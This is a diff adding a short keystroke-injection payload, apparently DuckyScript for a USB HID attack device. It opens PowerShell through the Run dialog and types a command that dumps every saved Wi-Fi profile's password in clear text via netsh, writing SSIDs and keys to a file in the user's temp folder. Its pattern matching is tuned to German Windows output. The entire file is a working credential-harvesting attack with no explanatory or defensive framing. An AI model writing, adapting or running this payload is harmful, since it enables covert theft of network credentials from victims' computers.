@@ -1,0 +1,7 @@
+GUI R
+DELAY 200
+STRING powershell
+STRING "$list=((netsh.exe wlan show profiles) -match '\s:\s') -replace '.*:\s', '';
+STRING foreach($network in $list){ ((netsh wlan show profile $network key=clear) -match 'sselinhalt.*:|SSID-n.*:|SSID n|Key C') | Out-File -append -FilePath $env:tmp\test.txt -Encoding ascii};
+STRING exit"
+ENTER
